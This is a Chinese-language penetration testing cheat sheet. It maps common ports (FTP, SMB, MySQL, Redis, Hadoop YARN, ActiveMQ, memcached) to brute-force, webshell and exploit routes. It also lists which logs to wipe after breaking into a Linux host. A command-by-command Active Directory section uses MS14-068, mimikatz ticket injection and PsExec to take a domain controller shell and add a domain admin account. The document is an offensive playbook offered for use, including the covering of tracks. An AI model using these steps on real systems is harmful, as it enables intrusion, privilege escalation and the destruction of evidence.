## 渗透思路

端口对应的服务

21端口，ftp 可爆破或者尝试匿名anonymous/空登录

| 21 ftp               | 可爆破<br/>匿名anonymous/空登录<br/>MS12-073                 |      |
| -------------------- | ------------------------------------------------------------ | ---- |
| 22 ssh               | 爆破                                                         |      |
| 80 web               |                                                              |      |
| 445 smb              | ms08-067 ms17-010溢出漏洞<br/>IPC$攻击                       |      |
| 3306 mysql           | 暴破<br/>成功后用mysql写入webshell，或者构造vbs写入服务器启动项，启动时添加管理员账号打开3389端口 |      |
| 8088 hadoop yarn     | 资源管理器rest api存在未授权访问漏洞，通过curl -v -X POST申请新的application，构造提交任务后即可在相应目录生成webshell |      |
| 8161 apache activeMQ | console存在默认端口和默认密码、未授权访问<br/>当activeMQ开启put请求时构造payload（即不存在的目录）response会返回相应的物理路径信息，当fileserver存在时我们可以上传jspwebshell，<br/>activeMQ还支持move协议，导致任意文件移动漏洞 |      |
| 6379 redis           | 配置不当的未授权 链接redis（./redis-cli -h IP)，可实现写入webshell，写入crontab计划任务fantanshell，以及写入ssh公钥，获取操作系统权限<br/>暴破 |      |
| 11211 memcached      | 默认情况下存在未授权访问，telnet ip就可以获得服务器敏感信息  |      |
|                      |                                                              |      |
|                      |                                                              |      |

## 流程

信息收集

漏洞挖掘

漏洞利用&权限提升

mysql serv-u Oracle

window溢出

linux脏牛、内核漏洞

### 入侵Linux后要清楚的日志

| web      | sed -i -e 定向清楚 |      |
| -------- | ------------------ | ---- |
| history  | ~                  |      |
| wtmp     |                    |      |
| 登录日志 |                    |      |

### 域内横向移动

| MS14-068         | kerkeo    klist klist  purge  删除所有票据<br>直接访问域控制器的C盘目录：dir \\qianxiao996-dm.qianxiao996.com\C$<br>查看本机用户信息,记录用户名与SID号whoami /all<br>进入MS14-068目录，使用以下命令：ip为域控的ip MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword><br/>MS14-068.exe -u zhangsanfeng@qianxiao996.com -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123`<br/>生成的票据文件<br>打开mimikatz，注入票据<br>`mimikatz # kerberos::purge          //清空当前凭证<br/>mimikatz # kerberos::list           //查看当前机器凭证<br/>mimikatz # kerberos::ptc 票据文件    //将上一步生成的票据注入到内存中`<br><br/>再次列出域控制器的C盘目录：再次列出域控制器的C盘目录：dir \\qianxiao996-dm.qianxiao996.com\C$<br>使用PSTools目录下的PsExec.exe获取shell:PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe<br>添加域管理员net user wangergou ABCabc123 /add /domain<br/>net group "Domain admins" wangergou /add /domain |      |
| ---------------- | ------------------------------------------------------------ | ---- |
| 0x02.GPP漏洞     | 组策略下发<br>管理工具中打开组策略管理：选择域，并新建组织单位：选择新建的组织单位，并建立GPO：点击新建的GPO：设定组策略作用范围：（选择一个组，必须是存在的组）右键选择GPO，选择编辑–本地用户和组：新建一个用户：域成员上更新组策略，并查看用户:gpupdate net user |      |
| 0x03.SPN票据破解 | 列出当前用户的票据：Kerberos::list <br>导出票据：Kerberos::list /export |      |
|                  |                                                              |      |

